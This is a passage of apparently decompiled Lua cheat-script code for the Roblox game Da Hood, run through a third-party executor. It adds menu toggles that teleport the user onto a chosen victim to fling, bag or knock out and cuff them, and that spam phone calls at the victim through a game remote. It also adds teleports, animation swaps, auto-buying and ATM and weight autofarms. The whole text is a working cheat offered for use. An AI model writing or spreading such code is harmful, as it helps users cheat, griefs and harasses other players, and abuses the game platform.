                if _G.targetPlayer.Character.Humanoid.MoveDirection.X < 0 then
                  XCFrameChange = -6
                else
                  if _G.targetPlayer.Character.Humanoid.MoveDirection.X > 0 then
                    XCFrameChange = 6
                  else
                    XCFrameChange = 0
                  end
                end

                if _G.targetPlayer.Character.Humanoid.MoveDirection.Z < 0 then
                  ZCFrameChange = -6
                else
                  if _G.targetPlayer.Character.Humanoid.MoveDirection.Z > 0 then
                    ZCFrameChange = 6
                  else
                    ZCFrameChange = 0
                  end
                end

                if game.Players.LocalPlayer.Character then
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(_G.targetPlayer.Character.UpperTorso.Position.X + (math.random(
                    -3, 3
                  )) + XCFrameChange, _G.targetPlayer.Character.UpperTorso.Position.Y, _G.targetPlayer.Character.UpperTorso.Position.Z + (math.random(
                    -3, 3
                  )) + ZCFrameChange)) * (CFrame.Angles(
                    math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.X + 350), math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Y + 200), math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Z + 240)
                  ))
                end
              end

              return
            end)
          else
            getgenv().csync = false

            if Flinging then

              Flinging:Disconnect()
              Flinging = nil
            end

            if connect4 then

              connect4:Disconnect()
              connect4 = nil
            end

            StopFling()

            for i8 = 1, 150 do
              task.wait()
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saveposfling)
            end
          end

          return
        end)

        position3 = nil
        val217 = false
        val96 = ui

        ui:AddToggle(target, "Bag", false, function(p76)
local localPlayer23

          if p76 then
            local targetPlayer8 = _G.targetPlayer

            if not targetPlayer8 then
              return
            else

              if (targetPlayer8.Character:FindFirstChild("Christmas_Sock")) then
                notify({
                  Description = "target is already bagged.", Title = "Warning", Duration = 5, })

                return
              else
                getgenv().csync = true
                wait(0.1)

                game.Players.LocalPlayer.Backpack:FindFirstChild("[BrownBag]")

                repeat
                  local character68 = game.Players.LocalPlayer.Character
                  local humanoidRootPart24 = character68

                  if character68 then

                    humanoidRootPart24 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                  end

                  if humanoidRootPart24 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[BrownBag] - $27"].Head.CFrame * (CFrame.new(
                      0, 1, 0
                    ))

                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                      0, 0, 0
                    )

                    local clickDetector12 = game.Workspace.Ignored.Shop["[BrownBag] - $27"]:FindFirstChildWhichIsA("ClickDetector")

                    if clickDetector12 then
                      fireclickdetector(clickDetector12)
                    end
                  end

                  task.wait(0.01)
                  backpack15 = game.Players.LocalPlayer.Backpack
                until (backpack15:FindFirstChild("[BrownBag]"))

                position3 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                val217 = true

                if not (targetPlayer8.Character:FindFirstChild("Christmas_Sock")) then

                  local v1409 = not (game.Players.LocalPlayer.Character:FindFirstChild("[BrownBag]"))
                end

                repeat
                  task.wait()
                  local localPlayer24 = helper10(game.Players.LocalPlayer.Character)
                  local val463 = helper10(targetPlayer8.Character)
                  local val464 = not localPlayer24
                  local val465 = helper9(targetPlayer8.Character)
                  local val466 = val464

                  if not val464 then

                    val466 = not val463 or not val465
                  end

                  if val466 then
                    break
                  else

                    local findFirstChild8 = game.Workspace.Vehicles:FindFirstChild(targetPlayer8.Name)

                    if findFirstChild8 then
                      localPlayer24.CFrame = (CFrame.new(findFirstChild8.Position))
                        * (CFrame.new(findFirstChild8.Velocity * 0.4))
                    end

                    if not (game.Players.LocalPlayer.Character:FindFirstChild("[BrownBag]")) then
                      game.Players.LocalPlayer.Character.Humanoid.Sit = false
                      game.Players.LocalPlayer.Backpack:FindFirstChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character
                    else

                      game.Players.LocalPlayer.Character:FindFirstChild("[BrownBag]"):Activate()

                      localPlayer24.CFrame = CFrame.new(val463.Position + (Vector3.new(0, -5, 0))
                        + val465.MoveDirection * 0.4 * val465.WalkSpeed)
                    end

                    helper11(val463)

                    local christmasSock = targetPlayer8.Character:FindFirstChild("Christmas_Sock")
                    localPlayer23 = christmasSock

                    if not christmasSock then

                      localPlayer23 = not (game.Players.LocalPlayer.Character:FindFirstChild("[BrownBag]"))
                        or val217 == false
                    end
                  end
                until localPlayer23

                val217 = false
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position3)
                getgenv().csync = false
                ::L1178912::
                return
              end
            end
          else
            getgenv().csync = false
            val217 = false
            goto L1178912
          end
        end)

        position4 = nil
        val218 = false
        val97 = ui

        ui:AddToggle(target, "arrest", false, function(p77)
local val467, bodyEffects

          if p77 then
            local targetPlayer9 = _G.targetPlayer

            if not targetPlayer9 then
              return
            else

              if game.Players.LocalPlayer.DataFolder:FindFirstChild("Officer").Value ~= 1 then
                notify({
                  Description = "you have to be an officer to arrest.", Title = "TBO", Duration = 5, })

                return
              else

                if targetPlayer9.leaderstats:FindFirstChild("Wanted").Value <= 0 then
                  notify({ Description = "target has 0 bounty.", Title = "TBO", Duration = 5 })
                  return
                else
                  getgenv().csync = true
                  wait(0.1)

                  position4 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                  val218 = true

                  if not (targetPlayer9.Character.BodyEffects:FindFirstChild("K.O").Value == true) then
                  end

                  repeat
                    task.wait()
                    local localPlayer25 = helper10(game.Players.LocalPlayer.Character)
                    local val468 = helper10(targetPlayer9.Character)
                    local val469 = helper9(targetPlayer9.Character)
                    local val470 = not localPlayer25
                    local val471 = val470

                    if not val470 then

                      val471 = not val468 or not val469
                    end

                    if val471 then
                      break
                    else

                      local findFirstChild9 = game.Workspace.Vehicles:FindFirstChild(targetPlayer9.Name)

                      if findFirstChild9 then
                        localPlayer25.CFrame = (CFrame.new(findFirstChild9.Position))
                          * (CFrame.new(findFirstChild9.Velocity * 0.4)) * (CFrame.new(0, 0, 0))
                      end

                      local val472 = not (targetPlayer9.Character.BodyEffects:FindFirstChild("K.O"))
                      local val473 = val472

                      if not val472 then

                        val473 = not targetPlayer9.Character.BodyEffects:FindFirstChild("K.O").Value
                      end

                      if val473 then
                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        helper19()
                        local val474 = _G.attackMethod == "Rifle"
                        local val475 = val474

                        if not val474 then

                          val475 = _G.attackMethod == "LMG" or _G.attackMethod == "AUG"
                        end

                        if val475 then
                          localPlayer25.CFrame = CFrame.new(val468.Position + (Vector3.new(0, 3, 0))
                            + val469.MoveDirection * 0.6 * val469.WalkSpeed)
                        else

                          local tool14 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                          local localPlayer26 = tool14

                          if tool14 then

                            localPlayer26 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
                              == "Combat"
                          end

                          if localPlayer26 then

                            if (game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk")) then
                              localPlayer25.CFrame = CFrame.new(val468.Position + (Vector3.new(0, -5, 0))
                                + val469.MoveDirection * 0.4 * val469.WalkSpeed)
                            else
                              localPlayer25.CFrame = CFrame.new(
                                math.random(-500, 500), 500, math.random(-500, 500)
                              )
                            end
                          else
                            localPlayer25.CFrame = CFrame.new(val468.Position + (Vector3.new(0, -5, 0))
                              + val469.MoveDirection * 0.4 * val469.WalkSpeed)
                          end
                        end
                      end

                      helper11(val468)

                      val467 = targetPlayer9.Character.BodyEffects:FindFirstChild("K.O").Value
                          == true
                        or val218 == false
                    end
                  until val467

                  if not (targetPlayer9.Character:FindFirstChild("BodyEffects"):FindFirstChild("Cuff").Value
                    == true) then
                  end

                  repeat
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(targetPlayer9.Character.UpperTorso.Position)) * (CFrame.new(
                      0, 3, 0
                    ))

                    if not (targetPlayer9.Character:FindFirstChild("K.O")) then

                      game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()

                      if (game.Players.LocalPlayer.Character:FindFirstChild("Cuff")) then

                        game.Players.LocalPlayer.Character:FindFirstChild("Cuff"):Activate()
                      else
                        game.Players.LocalPlayer.Backpack:FindFirstChild("Cuff").Parent = game.Players.LocalPlayer.Character
                      end
                    end

                    task.wait()

                    bodyEffects = targetPlayer9.Character:FindFirstChild("BodyEffects"):FindFirstChild("Cuff").Value
                        == true
                      or val218 == false
                  until bodyEffects

                  val218 = false
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position4)
                  getgenv().csync = false
                  ::L10387173::
                  return
                end
              end
            end
          else
            getgenv().csync = false
            val218 = false
            goto L10387173
          end
        end)

        val219 = false

        function waitLoop8()
          local targetPlayer10 = _G.targetPlayer

          if targetPlayer10 then
            val219 = true

            while val219 do
              wait()

              local phone = game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]")

              if phone then
                phone.Parent = game.Players.LocalPlayer.Character
                phone:Activate()
                phone:Deactivate()
                phone.Parent = game.Players.LocalPlayer.Backpack
              end

              wait()

              game:GetService("ReplicatedStorage").MainEvent:FireServer(
                "PhoneCall", targetPlayer10.Name
              )

              task.wait(0.1)
            end
          else
            print("Player not found.")
          end

          return
        end

        val98 = ui

        ui:AddToggle(target, "invis spam call", false, function(p78)
          val219 = p78

          if p78 then
            waitLoop8()
          end

          return
        end)

        val99 = ui

        ui:AddButton(teleports, "Bank", function()
          helper14(CFrame.new(-432.14392089844, 38.964965820312, -284.10165405273))
          return
        end)

        val100 = ui

        ui:AddButton(teleports, "Uphill Gunstore", function()
          helper14(CFrame.new(481.30459594727, 48.070503234863, -620.1513671875))
          return
        end)

        val101 = ui

        ui:AddButton(teleports, "Downhill Gunstore", function()
          helper14(CFrame.new(-578.57965087891, 8.3147792816162, -736.38848876953))
          return
        end)

        val102 = ui

        ui:AddButton(teleports, "Hood Fitness", function()
          helper14(CFrame.new(-76.495727539062, 22.700284957886, -630.98162841797))
          return
        end)

        val103 = ui

        ui:AddButton(teleports, "Bar", function()
          helper14(CFrame.new(-264.55044555664, 48.526691436768, -446.29254150391))
          return
        end)

        val104 = ui

        ui:AddButton(teleports, "Safe 2", function()
          helper14(CFrame.new(-117, -57, 147))
          return
        end)

        val105 = ui

        ui:AddButton(teleports, "Safe 3", function()
          helper14(CFrame.new(-546, 173, 1))
          return
        end)

        val106 = ui

        ui:AddButton(teleports, "Safe 5", function()
          helper14(CFrame.new(0, 150, 0))
          return
        end)

        val107 = ui

        ui:AddButton(teleports, "Safe for Test", function()
          helper14(CFrame.new(11, 12, 214))
          return
        end)

        val108 = ui

        ui:AddButton(teleports, "Da Furniture", function()
          helper14(CFrame.new(-489.16403198242, 21.849847793579, -76.609573364258))
          return
        end)

        val109 = ui

        ui:AddButton(teleports, "School", function()
          helper14(CFrame.new(-531.35314941406, 21.749992370605, 252.47506713867))
          return
        end)

        val110 = ui

        ui:AddButton(teleports, "Da Casino", function()
          helper14(CFrame.new(-863.46643066406, 21.599954605103, -152.92788696289))
          return
        end)

        val111 = ui

        ui:AddButton(teleports, "Da Theatre", function()
          helper14(CFrame.new(-1004.9942626953, 25.100023269653, -135.17315673828))
          return
        end)

        val112 = ui

        ui:AddButton(teleports, "Basketball Court", function()
          helper14(CFrame.new(-896.56433105469, 21.99981880188, -528.73175048828))
          return
        end)

        val113 = ui

        ui:AddButton(teleports, "Hair Salon", function()
          helper14(CFrame.new(-855.55810546875, 22.00500869751, -665.01702880859))
          return
        end)

        val114 = ui

        ui:AddButton(teleports, "FoodsMart", function()
          helper14(CFrame.new(-906.58337402344, 22.005002975464, -653.22259521484))
          return
        end)

        val115 = ui

        ui:AddButton(teleports, "Mat Laundry", function()
          helper14(CFrame.new(-971.42413330078, 22.005887985229, -630.11547851562))
          return
        end)

        val116 = ui

        ui:AddButton(teleports, "Swift", function()
          helper14(CFrame.new(-799.76031494141, 21.879999160767, -662.31097412109))
          return
        end)

        val117 = ui

        ui:AddButton(teleports, "Military Base", function()
          helper14(CFrame.new(-50.41296005249, 25.254997253418, -868.92114257812))
          return
        end)

        val118 = ui

        ui:AddButton(teleports, "Da Boxing Club", function()
          helper14(CFrame.new(-232.0669708252, 22.067293167114, -1119.9541015625))
          return
        end)

        val119 = ui

        ui:AddButton(teleports, "Flowers", function()
          helper14(CFrame.new(-71.62272644043, 23.150568008423, -327.79412841797))
          return
        end)

        val120 = ui

        ui:AddButton(teleports, "Hospital", function()
          helper14(CFrame.new(98.401962280273, 22.799989700317, -484.89385986328))
          return
        end)

        val121 = ui

        ui:AddButton(teleports, "Hood Kicks", function()
          helper14(CFrame.new(-203.5334777832, 21.845796585083, -410.15298461914))
          return
        end)

        val122 = ui

        ui:AddButton(teleports, "Police Station", function()
          helper14(CFrame.new(-265.49996948242, 21.79797744751, -96.515174865723))
          return
        end)

        val123 = ui

        ui:AddButton(teleports, "Barbra", function()
          helper14(CFrame.new(9.0038728713989, 21.748020172119, -107.73101043701))
          return
        end)

        val124 = ui

        ui:AddButton(teleports, "Church", function()
          helper14(CFrame.new(205.82136535645, 23.778020858765, -58.470775604248))
          return
        end)

        val125 = ui

        ui:AddButton(teleports, "Train", function()
          helper14(CFrame.new(-426.41705322266, -21.251979827881, 44.953758239746))
          return
        end)

        val126 = ui

        ui:AddButton(teleports, "Save Position", function()
          _G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
          return
        end)

        val127 = ui

        ui:AddButton(teleports, "Load Position", function()
          helper14(CFrame.new(_G.savedhumanoidpos))
          return
        end)

        function iterate4(val476)
          for index12, value81 in ipairs(val476:GetPlayingAnimationTracks()) do
            value81:Stop()
          end

          return
        end

        function helper12(val477, val478)
          local animate13 = val477:WaitForChild("Animate")
          animate13.Disabled = true
          animate13.idle.Animation1.AnimationId = val478.idle1
          animate13.idle.Animation2.AnimationId = val478.idle2
          animate13.walk.WalkAnim.AnimationId = val478.walk
          animate13.run.RunAnim.AnimationId = val478.run
          animate13.jump.JumpAnim.AnimationId = val478.jump
          animate13.climb.ClimbAnim.AnimationId = val478.climb
          animate13.fall.FallAnim.AnimationId = val478.fall
          animate13.Disabled = false

          return
        end

        val220 = iterate4

        function helper13(val479)

          local localPlayer5 = game:GetService("Players").LocalPlayer
          local character69 = localPlayer5.Character
          local val480 = character69

          if not character69 then

            val480 = localPlayer5.CharacterAdded:Wait()
          end

          local object5 = val480
          local humanoid13 = object5:FindFirstChildOfClass("Humanoid")

          iterate4(humanoid13 or object5:FindFirstChildOfClass("AnimationController"))
          val221(object5, val479)
          return
        end

        val221 = helper12
        val222 = helper13
        val223 = false
        connect7 = nil
        val224 = nil
        val128 = ui

        ui:AddToggle(animations, "permanently", false, function(p83)

          if p83 then

            connect7 = game.Players.LocalPlayer.CharacterAdded:Connect(function(character70)
              local humanoid14 = character70:WaitForChild("Humanoid")

              iterate4(humanoid14 or character70:WaitForChild("AnimationController"))
              val221(character70, val224)
              return
            end)
          else
            if connect7 then

              connect7:Disconnect()
              connect7 = nil
            end
          end

          return
        end)

        val129 = ui

        ui:AddButton(animations, "animation adidas", function()
          local val481 = {
            idle1 = "http://www.roblox.com/asset/?id=18537376492", idle2 = "http://www.roblox.com/asset/?id=18537371272", walk = "http://www.roblox.com/asset/?id=18537392113", run = "http://www.roblox.com/asset/?id=18537384940", jump = "http://www.roblox.com/asset/?id=18537380791", climb = "http://www.roblox.com/asset/?id=18537363391", fall = "http://www.roblox.com/asset/?id=18537367238", }

          val224 = val481
          helper13(val481)
          return
        end)

        val130 = ui

        ui:AddButton(animations, "animation dahood", function()
          local val482 = {
            idle1 = "http://www.roblox.com/asset/?id=3119980985", idle2 = "http://www.roblox.com/asset/?id=3119980985", walk = "http://www.roblox.com/asset/?id=707897309", run = "http://www.roblox.com/asset/?id=2791325054", jump = "http://www.roblox.com/asset/?id=707853694", climb = "http://www.roblox.com/asset/?id=16738332169", fall = "http://www.roblox.com/asset/?id=707829716", }

          val224 = val482
          helper13(val482)
          return
        end)

        val131 = ui

        ui:AddButton(animations, "animation R6", function()
          local val483 = {
            idle1 = "http://www.roblox.com/asset/?id=12521158637", idle2 = "http://www.roblox.com/asset/?id=12521162526", walk = "http://www.roblox.com/asset/?id=12518152696", run = "http://www.roblox.com/asset/?id=12518152696", jump = "http://www.roblox.com/asset/?id=12520880485", climb = "http://www.roblox.com/asset/?id=11600205519", fall = "http://www.roblox.com/asset/?id=12520972571", }

          val224 = val483
          helper13(val483)
          return
        end)

        val132 = ui

        ui:AddButton(animations, "animation Bubbly", function()
          local val484 = {
            idle1 = "http://www.roblox.com/asset/?id=10921054344", idle2 = "http://www.roblox.com/asset/?id=10921055107", walk = "http://www.roblox.com/asset/?id=16738340646", run = "http://www.roblox.com/asset/?id=10921057244", jump = "http://www.roblox.com/asset/?id=10921062673", climb = "http://www.roblox.com/asset/?id=10921061530", fall = "http://www.roblox.com/asset/?id=707829716", }

          val224 = val484
          helper13(val484)
          return
        end)

        val133 = ui

        ui:AddButton(animations, "animation baseidle zombie", function()
          local val485 = {
            idle1 = "http://www.roblox.com/asset/?id=17172918855", idle2 = "http://www.roblox.com/asset/?id=17173014241", walk = "http://www.roblox.com/asset/?id=616168032", run = "http://www.roblox.com/asset/?id=616163682", jump = "http://www.roblox.com/asset/?id=1083218792", climb = "http://www.roblox.com/asset/?id=16738332169", fall = "http://www.roblox.com/asset/?id=10921337907", }

          val224 = val485
          helper13(val485)
          return
        end)

        val134 = ui

        ui:AddButton(animations, "animation baseidle", function()
          local val486 = {
            idle1 = "http://www.roblox.com/asset/?id=17172918855", idle2 = "http://www.roblox.com/asset/?id=17173014241", walk = "http://www.roblox.com/asset/?id=707897309", run = "http://www.roblox.com/asset/?id=742638842", jump = "http://www.roblox.com/asset/?id=1083218792", climb = "http://www.roblox.com/asset/?id=16738332169", fall = "http://www.roblox.com/asset/?id=10921337907", }

          val224 = val486
          helper13(val486)
          return
        end)

        val135 = ui

        ui:AddButton(animations, "animation fidget", function()
          local val487 = {
            idle1 = "http://www.roblox.com/asset/?id=4417977954", idle2 = "http://www.roblox.com/asset/?id=4417978624", walk = "http://www.roblox.com/asset/?id=707897309", run = "http://www.roblox.com/asset/?id=4417979645", jump = "http://www.roblox.com/asset/?id=707853694", climb = "http://www.roblox.com/asset/?id=16738332169", fall = "http://www.roblox.com/asset/?id=707829716", }

          val224 = val487
          helper13(val487)
          return
        end)

        val136 = ui

        ui:AddButton(animations, "animation Cartoony", function()
          local val488 = {
            idle1 = "http://www.roblox.com/asset/?id=742637544", idle2 = "http://www.roblox.com/asset/?id=742638445", walk = "http://www.roblox.com/asset/?id=742640026", run = "http://www.roblox.com/asset/?id=742638842", jump = "http://www.roblox.com/asset/?id=742637942", climb = "http://www.roblox.com/asset/?id=742636889", fall = "http://www.roblox.com/asset/?id=742637151", }

          val224 = val488
          helper13(val488)
          return
        end)

        val137 = ui

        ui:AddButton(animations, "animation Ninja", function()
          local val489 = {
            idle1 = "http://www.roblox.com/asset/?id=656117400", idle2 = "http://www.roblox.com/asset/?id=656118341", walk = "http://www.roblox.com/asset/?id=656121766", run = "http://www.roblox.com/asset/?id=656118852", jump = "http://www.roblox.com/asset/?id=656117878", climb = "http://www.roblox.com/asset/?id=656114359", fall = "http://www.roblox.com/asset/?id=656115606", }

          val224 = val489
          helper13(val489)
          return
        end)

        val138 = ui

        ui:AddButton(animations, "animation robot", function()
          local val490 = {
            idle1 = "http://www.roblox.com/asset/?id=616088211", idle2 = "http://www.roblox.com/asset/?id=616089559", walk = "http://www.roblox.com/asset/?id=616095330", run = "http://www.roblox.com/asset/?id=616091570", jump = "http://www.roblox.com/asset/?id=616090535", climb = "http://www.roblox.com/asset/?id=616086039", fall = "http://www.roblox.com/asset/?id=616087089", }

          val224 = val490
          helper13(val490)
          return
        end)

        val139 = ui

        ui:AddButton(animations, "animation Toy", function()
          local val491 = {
            idle1 = "http://www.roblox.com/asset/?id=782841498", idle2 = "http://www.roblox.com/asset/?id=782845736", walk = "http://www.roblox.com/asset/?id=782843345", run = "http://www.roblox.com/asset/?id=782842708", jump = "http://www.roblox.com/asset/?id=782847020", climb = "http://www.roblox.com/asset/?id=782843869", fall = "http://www.roblox.com/asset/?id=782846423", }

          val224 = val491
          helper13(val491)
          return
        end)

        for key69, value82 in pairs(game:GetService("Workspace").Ignored.Shop:GetChildren()) do
          local element15 = value82

          ui:AddButton(autoBuy, element15.Name, function()
            getgenv().csync = true
            wait(0.1)
            local head4 = element15:FindFirstChild("Head")

            if head4 then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = head4.CFrame
              local clickDetector13 = element15:FindFirstChild("ClickDetector")

              if clickDetector13 then
                wait(0.25)
                fireclickdetector(clickDetector13)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                task.wait(0.2)
                getgenv().csync = false
              end
            end

            return
          end)
        end

        originalPosition = nil

        function helper20()
local val492, val493, val494, val495, val496, val497, val498

          if getgenv().farm then
            if setfflag then
              setfflag("TaskSchedulerTargetFps", 1000)
            end

            originalPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

            game:IsLoaded()

            repeat
              task.wait()
              val492 = game
            until (val492:IsLoaded())

            if not (game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR")) then
              local farm = getgenv().farm
            end

            repeat
              task.wait()

              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
                0, 1000, 0
              )

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              fullyLOADEDCHAR = (game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR"))
                or not getgenv().farm
            until fullyLOADEDCHAR

            local farm2 = getgenv().farm

            repeat
              task.wait()
              local element16 = nil

              for index13, value83 in ipairs(workspace.Cashiers:GetChildren()) do

                if value83.Name ~= "VAULT" and value83.Humanoid.Health > 0 then
                  element16 = value83
                end
              end

              if element16 then
                if not (element16.Humanoid.Health <= 0) then
                  local farm3 = getgenv().farm
                end

                repeat
                  task.wait()

                  if (game.Players.LocalPlayer.Character:FindFirstChildOfClass("Highlight")) then
                    game.Players.LocalPlayer.Character.Humanoid.Sit = false
                    local val499 = tick()
                    local health = element16.Humanoid.Health

                    if not ((tick()) - val499 > 1) then

                      local v1532 = health ~= element16.Humanoid.Health or not getgenv().farm
                    end

                    repeat
                      task.wait()

                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = element16.Open.CFrame * (CFrame.new(
                        -1, 0, 0
                      ))

                      game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                        0, 0, 0
                      )

                      local val500 = (tick()) - val499 > 1
                      val493 = val500

                      if not val500 then

                        val493 = health ~= element16.Humanoid.Health or not getgenv().farm
                      end
                    until val493
                  else
                    game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid

                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = element16.Open.CFrame * (CFrame.new(
                      0, -10, 0
                    ))

                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                      0, 0, 0
                    )
                  end

                  if (game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")) then

                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Combat"))
                  else

                    if (game.Players.LocalPlayer.Character:FindFirstChild("Combat")) then

                      game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
                    else

                      if not (game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")) then
                        local farm4 = getgenv().farm
                      end

                      repeat
                        task.wait()

                        combat = (game.Players.LocalPlayer.Backpack:FindFirstChild("Combat"))
                          or not getgenv().farm
                      until combat
                    end
                  end

                  val494 = element16.Humanoid.Health <= 0 or not getgenv().farm
                until val494

                local val501 = tick()

                if not ((tick()) - val501 > 1) then
                  local farm5 = getgenv().farm
                end

                repeat
                  task.wait()

                  game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid

                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = element16.Open.CFrame * (CFrame.new(
                    0, -10, 0
                  ))

                  game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                    0, 0, 0
                  )

                  val495 = (tick()) - val501 > 1 or not getgenv().farm
                until val495

                for index14, value84 in ipairs(workspace.Ignored.Drop:GetChildren()) do
                  if value84.Name == "MoneyDrop" then
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                        - value84.Position).Magnitude
                      < 10 then
                      local val502 = tick()

                      if not (value84.Parent == nil) then
                        local farm6 = getgenv().farm
                      end

                      repeat
                        task.wait()

                        if not ((game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Dead"))
                          and game.Players.LocalPlayer.Character.BodyEffects.Dead.Value == true) then
                          local val503 = (tick()) - val502 > 0.6

                          if val503 and value84:FindFirstChild("ClickDetector") then
                            local val504 = (identifyexecutor()) ~= "AWP"
                            local val505 = val504

                            if val504 then
                              local val506 = (identifyexecutor()) ~= "Swift"
                              local userInputService = val506

                              if val506 then

                                userInputService = not game:GetService("UserInputService").TouchEnabled
                              end

                              val505 = userInputService
                            end

                            if val505 then

                              if (game.Players.LocalPlayer.Character:FindFirstChild("Combat")) then
                                game.Players.LocalPlayer.Character:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Backpack
                              end
                            end

                            fireclickdetector(value84.ClickDetector)
                          end
                        end

                        game.Workspace.Camera.CameraSubject = value84

                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(value84.Position)) * (CFrame.new(
                          0, -10, 0
                        ))

                        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                          0, 0, 0
                        )

                        val498 = value84.Parent == nil or not getgenv().farm
                      until val498
                    else
                      if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                          - value84.Position).Magnitude
                        < 20 then
                        local val507 = tick()

                        if not ((tick()) - val507 > 0.25) then
                          local farm7 = getgenv().farm
                        end

                        repeat
                          task.wait()

                          game.Workspace.Camera.CameraSubject = value84

                          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(value84.Position)) * (CFrame.new(
                            0, -10, 0
                          ))

                          game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                            0, 0, 0
                          )

                          val496 = (tick()) - val507 > 0.25 or not getgenv().farm
                        until val496

                        local val508 = tick()

                        if not (value84.Parent == nil) then
                          local farm8 = getgenv().farm
                        end

                        repeat
                          task.wait()

                          if not ((game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Dead"))
                            and game.Players.LocalPlayer.Character.BodyEffects.Dead.Value
                              == true) then
                            local val509 = (tick()) - val508 > 0.6

                            if val509 and value84:FindFirstChild("ClickDetector") then
                              local val510 = (identifyexecutor()) ~= "AWP"
                              local val511 = val510

                              if val510 then
                                local val512 = (identifyexecutor()) ~= "Swift"
                                local userInputService2 = val512

                                if val512 then

                                  userInputService2 = not game:GetService("UserInputService").TouchEnabled
                                end

                                val511 = userInputService2
                              end

                              if val511 then

                                if (game.Players.LocalPlayer.Character:FindFirstChild("Combat")) then
                                  game.Players.LocalPlayer.Character:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Backpack
                                end
                              end

                              fireclickdetector(value84.ClickDetector)
                            end
                          end

                          game.Workspace.Camera.CameraSubject = value84

                          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(value84.Position)) * (CFrame.new(
                            0, -10, 0
                          ))

                          game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                            0, 0, 0
                          )

                          val497 = value84.Parent == nil or not getgenv().farm
                        until val497
                      end
                    end
                  end
                end
              else
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
                  0, 1000, 0
                )

                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                  0, 0, 0
                )
              end
            until not getgenv().farm
          end

          return
        end

        val140 = ui

        ui:AddToggle(autofarm, "ATM Farm", false, function(p84)
          getgenv().farm = p84

          if p84 then
            helper20()
          else
            game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid

            if originalPosition then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition
            end
          end

          return
        end)

        game.Players.LocalPlayer.CharacterAdded:Connect(function(character73)
          character73:WaitForChild("HumanoidRootPart")

          if getgenv().farm then
            helper20()
          end

          return
        end)

        val141 = ui

        ui:AddToggle(autofarm, "Weight Farm", false, function(weightFarm)
          getgenv().WeightFarm = weightFarm
          local position8 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

          local function helper22()

            while getgenv().WeightFarm do

              game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

              local localPlayer27 = not (game.Players.LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]"))
              local localPlayer28 = localPlayer27

              if localPlayer27 then

                localPlayer28 = not (game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]"))
              end

              if localPlayer28 then

                game.Players.LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]")

                repeat
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[HeavyWeights] - $281"].Head.CFrame

